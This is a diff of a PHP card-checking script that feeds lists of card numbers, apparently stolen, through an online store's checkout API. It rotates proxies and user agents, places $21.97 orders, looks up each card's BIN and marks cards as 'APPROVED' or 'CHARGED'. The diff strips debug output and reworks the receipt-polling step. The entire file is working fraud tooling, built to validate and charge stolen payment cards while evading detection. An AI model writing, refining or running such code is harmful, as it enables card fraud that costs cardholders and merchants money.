@@ -1,14 +1,11 @@
 <?php
 session_start();
-// Turn off output buffering
 @ob_end_flush();
 @ini_set('output_buffering', 'off');
 @ini_set('zlib.output_compression', false);
-// header('Content-Encoding: none');
 @ini_set('implicit_flush', true);
 while (ob_get_level()) ob_end_clean();
 ob_implicit_flush(true);
-
 
 require_once 'ua.php';
 $agent = new userAgent();
@@ -24,12 +21,6 @@ $user_agents = [
 
 // Randomly select user agent
 $ua = $user_agents[array_rand($user_agents)];
-
-// Add random delay
-$delay = rand(3, 8);
-echo "<pre>⏳ Adding delay: {$delay} seconds</pre>";
-flush();
-sleep($delay);
 
 // Important functions start
 function find_between($content, $start, $end)
@@ -260,8 +251,8 @@ if (count($cc_lines) >= 100) {
 
 // Loop through each cc
 foreach ($cc_lines as $cc_line) {
+    $start_time = microtime(true);
     $cc1 = trim($cc_line);
-    // Now the rest of the code uses $cc1
 
     if (empty($cc1)) {
         echo json_encode([
@@ -269,7 +260,6 @@ foreach ($cc_lines as $cc_line) {
             'Message' => 'Please enter card details',
             'Owner' => '⚡⚡ @mhitzxg ⚡⚡',
         ]);
-        // Flush output after each card
         echo str_repeat(' ', 1024);
         flush();
         continue;
@@ -293,8 +283,6 @@ foreach ($cc_lines as $cc_line) {
         $sub_month = $month;
     }
 
-    // Proceed with other operations
-
     // The variables that may be uninitialized
     $err = '';
     $response = '';
@@ -313,17 +301,11 @@ foreach ($cc_lines as $cc_line) {
     
     $proxy = $proxy_array[array_rand($proxy_array)];
 
-    // Enhanced debugging
-    $debug_info = [];
-
     // Start of try-catch to handle exceptions
     try {
-        echo "<pre>🔍 Starting checkout process for: $cc|$sub_month|$year|$cvv</pre>";
-        flush();
-
         // First cURL request
         $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $urlbase.'/cart/42721297924198:2'); // Changed to 2 items
+        curl_setopt($ch, CURLOPT_URL, $urlbase.'/cart/42721297924198:2');
         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
@@ -358,7 +340,6 @@ foreach ($cc_lines as $cc_line) {
             $name = trim($parts[0]);
             $value = trim($parts[1]);
 
-            // Save the 'Location' header
             if (strtolower($name) === 'location') {
                 $headers['Location'] = $value;
             }
@@ -369,9 +350,6 @@ foreach ($cc_lines as $cc_line) {
         $response = curl_exec($ch);
         $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
         
-        $debug_info['step1_http_code'] = $http_code;
-        $debug_info['step1_response_length'] = strlen($response);
-
         if (curl_errno($ch)) {
             $err = 'cURL error: ' . curl_error($ch);
             curl_close($ch);
@@ -399,13 +377,11 @@ foreach ($cc_lines as $cc_line) {
         
         $x_checkout_one_session_token = find_between($response, '<meta name="serialized-session-token" content="&quot;', '&quot;"');
         if (empty($x_checkout_one_session_token)) {
-            // Try alternative extraction method
             $x_checkout_one_session_token = find_between($response, 'sessionToken&quot;:&quot;', '&quot;');
         }
         
         if (empty($x_checkout_one_session_token)) {
             $err = "Session token is empty - Check if site is accessible";
-            $debug_info['step1_response_sample'] = substr($response, 0, 500);
             throw new Exception($err);
         }
         
@@ -426,9 +402,6 @@ foreach ($cc_lines as $cc_line) {
             $err = 'Payment Method Identifier Token is empty';
             throw new Exception($err);
         }
-
-        echo "<pre>✅ Step 1 Complete - Session: " . substr($x_checkout_one_session_token, 0, 20) . "...</pre>";
-        flush();
 
         // Second cURL request (card)
         $ch = curl_init();
@@ -459,9 +432,6 @@ foreach ($cc_lines as $cc_line) {
         $response2 = curl_exec($ch);
         $http_code2 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
         
-        $debug_info['step2_http_code'] = $http_code2;
-        $debug_info['step2_response'] = $response2;
-
         if (curl_errno($ch)) {
             $err = 'cURL error: ' . curl_error($ch);
             curl_close($ch);
@@ -479,10 +449,7 @@ foreach ($cc_lines as $cc_line) {
         }
         curl_close($ch);
 
-        echo "<pre>✅ Step 2 Complete - Card Token: " . substr($cctoken, 0, 20) . "...</pre>";
-        flush();
-
-        // Third cURL request (receipt) - Updated with correct amounts
+        // Third cURL request (receipt)
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=SubmitForCompletion');
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
@@ -615,12 +582,12 @@ foreach ($cc_lines as $cc_line) {
                                 ],
                                 'quantity' => [
                                     'items' => [
-                                        'value' => 2 // Changed from 1 to 2
+                                        'value' => 2
                                     ]
                                 ],
                                 'expectedTotalPrice' => [
                                     'value' => [
-                                        'amount' => '15.98', // 2 items × 7.99
+                                        'amount' => '15.98',
                                         'currencyCode' => 'USD'
                                     ]
                                 ],
@@ -658,7 +625,7 @@ foreach ($cc_lines as $cc_line) {
                                 ],
                                 'amount' => [
                                     'value' => [
-                                        'amount' => '21.97', // Changed from 13.98 to 21.97
+                                        'amount' => '21.97',
                                         'currencyCode' => 'USD'
                                     ]
                                 ]
@@ -743,194 +710,92 @@ foreach ($cc_lines as $cc_line) {
         curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
 
         $response4 = curl_exec($ch);
-$http_code4 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        $http_code4 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
 
-$debug_info['step3_http_code'] = $http_code4;
-$debug_info['step3_response'] = $response4;
+        $response4js = json_decode($response4);
+        curl_close($ch);
 
-$response4js = json_decode($response4);
-curl_close($ch);
+        // FIXED: Correct GraphQL query for PollForReceipt
+        $pollQuery = 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id token redirectUrl __typename}...on ProcessingReceipt{id pollDelay __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}}}';
 
-// 🔥 ADD THIS TO SEE THE ACTUAL RESPONSE CONTENT
-echo "<pre>=== RAW RESPONSE ===</pre>";
-echo "<pre>" . htmlspecialchars($response4) . "</pre>";
-echo "<pre>=== END RAW RESPONSE ===</pre>";
+        if (isset($response4js->data->submitForCompletion->receipt->id)) {
+            $recipt_id = $response4js->data->submitForCompletion->receipt->id;
+            
+            // Fourth request - Poll for receipt status with CORRECT query
+            $postf2 = json_encode([
+                'query' => $pollQuery,
+                'variables' => [
+                    'receiptId' => $recipt_id,
+                    'sessionToken' => $x_checkout_one_session_token
+                ],
+                'operationName' => 'PollForReceipt'
+            ]);
 
-// Save the full response
-file_put_contents('step3_full_response.json', $response4);
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=PollForReceipt');
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
+            curl_setopt($ch, CURLOPT_HTTPHEADER, [
+                'accept: application/json',
+                'accept-language: en-US',
+                'content-type: application/json',
+                'origin: '.$urlbase,
+                'priority: u=1, i',
+                'referer: '.$urlbase,
+                'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
+                'sec-ch-ua-mobile: ?0',
+                'sec-ch-ua-platform: "Windows"',
+                'sec-fetch-dest: empty',
+                'sec-fetch-mode: cors',
+                'sec-fetch-site: same-origin',
+                'user-agent: '.$ua,
+                'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
+                'x-checkout-web-build-id: 63e3454a054ed16691c8d7d3dfaf57981df0b7df',
+                'x-checkout-web-deploy-stage: production',
+                'x-checkout-web-server-handling: fast',
+                'x-checkout-web-server-rendering: no',
+                'x-checkout-web-source-id: ' . $checkoutToken,
+            ]);
 
-// Check what's actually in the response
-if ($response4js) {
-    echo "<pre>=== PARSED RESPONSE STRUCTURE ===</pre>";
-    echo "<pre>" . json_encode($response4js, JSON_PRETTY_PRINT) . "</pre>";
-    
-    // Check all possible structures
-    if (isset($response4js->data->submitForCompletion->receipt->id)) {
-        $recipt_id = $response4js->data->submitForCompletion->receipt->id;
-        echo "<pre>🎫 RECEIPT ID FOUND: $recipt_id</pre>";
-    } 
-    elseif (isset($response4js->data->submitForCompletion->receipt)) {
-        echo "<pre>📦 Receipt object exists but no ID</pre>";
-        var_dump($response4js->data->submitForCompletion->receipt);
-    }
-    elseif (isset($response4js->data->submitForCompletion)) {
-        echo "<pre>📋 SubmitForCompletion object exists</pre>";
-        var_dump($response4js->data->submitForCompletion);
-    }
-    elseif (isset($response4js->data)) {
-        echo "<pre>📊 Data object exists</pre>";
-        var_dump($response4js->data);
-    }
-    elseif (isset($response4js->errors)) {
-        echo "<pre>❌ GraphQL Errors:</pre>";
-        foreach ($response4js->errors as $error) {
-            echo "<pre>   - " . ($error->message ?? 'Unknown') . "</pre>";
-        }
-    }
-} else {
-    echo "<pre>❌ Failed to parse JSON response</pre>";
-    echo "<pre>JSON Error: " . json_last_error_msg() . "</pre>";
-}
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $postf2);
 
-flush();
+            $response5 = curl_exec($ch);
+            $http_code5 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            curl_close($ch);
 
-// FIXED RECEIPT ID EXTRACTION
-if (isset($response4js->data->submitForCompletion->receipt->id)) {
-    $recipt_id = $response4js->data->submitForCompletion->receipt->id;
-    echo "<pre>🎫 RECEIPT ID FOUND: $recipt_id</pre>";
-} elseif (isset($response4js->data->submitForCompletion->__typename) && $response4js->data->submitForCompletion->__typename === 'SubmitSuccess') {
-    // Success but no receipt ID yet (processing)
-    $err = "🔄 Payment Processing - Check PollForReceipt";
-    echo "<pre>🔄 Payment submitted successfully, waiting for processing...</pre>";
-} elseif (isset($response4js->data->submitForCompletion->reason)) {
-    $err = "❌ Payment Failed: " . $response4js->data->submitForCompletion->reason;
-} elseif (isset($response4js->errors)) {
-    $err = "GraphQL Error: ";
-    foreach ($response4js->errors as $error) {
-        $err .= ($error->message ?? 'Unknown error') . " ";
-    }
-}
-
-// If we have receipt ID, proceed to poll
-if (!empty($recipt_id)) {
-    echo "<pre>✅ Step 3 Complete - Receipt ID: $recipt_id</pre>";
-    flush();
-    
-    sleep(2);
-    
-    // Fourth request - Poll for receipt status
-    $postf2 = json_encode([
-        'query' => 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id token redirectUrl __typename}...on ProcessingReceipt{id pollDelay __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}}',
-        'variables' => [
-            'receiptId' => $recipt_id,
-            'sessionToken' => $x_checkout_one_session_token
-        ],
-        'operationName' => 'PollForReceipt'
-    ]);
-
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=PollForReceipt');
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
-    curl_setopt($ch, CURLOPT_HTTPHEADER, [
-        'accept: application/json',
-        'accept-language: en-US',
-        'content-type: application/json',
-        'origin: '.$urlbase,
-        'priority: u=1, i',
-        'referer: '.$urlbase,
-        'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
-        'sec-ch-ua-mobile: ?0',
-        'sec-ch-ua-platform: "Windows"',
-        'sec-fetch-dest: empty',
-        'sec-fetch-mode: cors',
-        'sec-fetch-site: same-origin',
-        'user-agent: '.$ua,
-        'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
-        'x-checkout-web-build-id: 63e3454a054ed16691c8d7d3dfaf57981df0b7df',
-        'x-checkout-web-deploy-stage: production',
-        'x-checkout-web-server-handling: fast',
-        'x-checkout-web-server-rendering: no',
-        'x-checkout-web-source-id: ' . $checkoutToken,
-    ]);
-
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $postf2);
-
-    $start = microtime(true);
-    $response5 = curl_exec($ch);
-    $http_code5 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    $end = microtime(true);
-    $time_taken = number_format($end - $start, 2);
-    curl_close($ch);
-
-    echo "<pre>🔍 PollForReceipt Response - HTTP: $http_code5</pre>";
-    echo "<pre>Response: $response5</pre>";
-    
-    $r5js = json_decode($response5);
-    
-    // Process the poll response
-    if (isset($r5js->data->receipt->processingError->code)) {
-        $err = $r5js->data->receipt->processingError->code;
-        if (isset($r5js->data->receipt->processingError->messageUntranslated)) {
-            $err .= " - " . $r5js->data->receipt->processingError->messageUntranslated;
-        }
-    } elseif (isset($r5js->data->receipt->__typename) && $r5js->data->receipt->__typename === 'ProcessedReceipt') {
-        $err = '🔥 CHARGED $21.97 ✅';
-    } elseif (isset($r5js->data->receipt->__typename) && $r5js->data->receipt->__typename === 'ProcessingReceipt') {
-        $err = '🔄 Payment Still Processing';
-    } else {
-        $err = 'Unknown poll response';
-    }
-    
-} else {
-    // No receipt ID case
-    echo "<pre>❌ No receipt ID received from SubmitForCompletion</pre>";
-}
-
-        echo "<pre>✅ Step 4 Complete - Final Response Received</pre>";
-        flush();
-
-        // Enhanced response parsing
-        if (str_contains($response5, $checkouturl . '/thank_you')) {
-            $err = '🔥Thank you for your purchase! -> $21.97';
-        } elseif (str_contains($response5, $checkouturl . '/post_purchase')) {
-            $err = '🔥Thank you for your purchase! -> $21.97'; 
-        } elseif (str_contains($response5, 'Your order is confirmed')) {
-            $err = '🔥Your Order Has Been Placed! ->> $21.97';
-        } elseif (isset($r5js->data->receipt->processingError->code)) {
-            $err = $r5js->data->receipt->processingError->code;
-            if (isset($r5js->data->receipt->processingError->messageUntranslated)) {
-                $err .= " - " . $r5js->data->receipt->processingError->messageUntranslated;
+            $r5js = json_decode($response5);
+            
+            // Process the poll response
+            if (isset($r5js->data->receipt->processingError->code)) {
+                $err = $r5js->data->receipt->processingError->code;
+                if (isset($r5js->data->receipt->processingError->messageUntranslated)) {
+                    $err .= " - " . $r5js->data->receipt->processingError->messageUntranslated;
+                }
+            } elseif (isset($r5js->data->receipt->__typename) && $r5js->data->receipt->__typename === 'ProcessedReceipt') {
+                $err = '🔥 CHARGED $21.97 ✅';
+            } elseif (isset($r5js->data->receipt->__typename) && $r5js->data->receipt->__typename === 'ProcessingReceipt') {
+                $err = '🔄 Payment Still Processing';
+            } else {
+                $err = 'Payment processing failed';
             }
-        } elseif (str_contains($response5, 'CompletePaymentChallenge')) {
-            $err = '⚠️ 3D Secure Challenge Required!!';
-        } elseif (str_contains($response5, 'https://blackmp.life/stripe/authentications/')) {
-            $err = '⚠️3DS Required !!';
-        } elseif (isset($r5js->data->receipt->action->__typename) && $r5js->data->receipt->action->__typename == 'CompletePaymentChallenge') {
-            $err = '⚠️3DS Secure Required !!';
-        } elseif (isset($r5js->data->receipt->action->url)) {
-            $err = '⚠️ 3d Secure Card !!';
-        } elseif (preg_match('/CompletePaymentChallenge/', $response5)) {
-            $err = '⚠️ 3D secure Required';
+            
         } else {
-            $err = 'Response is empty! Check debug info';
+            $err = 'No receipt ID received';
         }
 
     } catch(Exception $e) {
         if (empty($err)) {
             $err = $e->getMessage();
         }
-        // Log debug info on error
-        file_put_contents('debug_'.time().'.json', json_encode($debug_info, JSON_PRETTY_PRINT));
     }
 
-    // ▶️ BIN lookup
-    $bin = substr($cc, 0, 6);
+    $end_time = microtime(true);
+    $time_taken = number_format($end_time - $start_time, 2);
 
-    // 🧠 First try binlist.net
+    // BIN lookup
+    $bin = substr($cc, 0, 6);
     $bininfo = @json_decode(file_get_contents("https://lookup.binlist.net/{$bin}"), true);
 
-    // 🔁 Fallback to antipublic if binlist fails or rate-limited
     if (!$bininfo || !isset($bininfo['bank'])) {
         $bininfo = @json_decode(file_get_contents("https://bins.antipublic.cc/bins/{$bin}"), true);
         $bank = $bininfo['data']['bank'] ?? 'Unavailable';
@@ -944,7 +809,7 @@ if (!empty($recipt_id)) {
         $type = $bininfo['type'] ?? 'Unknown';
     }
 
-    // ▶️ Status logic
+    // Status logic
     if (stripos($err, 'CHARGED') !== false || stripos($err, 'purchase') !== false || stripos($err, '⚠️ 3D Secure Challenge Required!!') !== false || stripos($err, 'INCORRECT_CVC') !== false || stripos($err, 'Order') !== false) {
         $status = "✅ 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐂𝐂";
     } else {
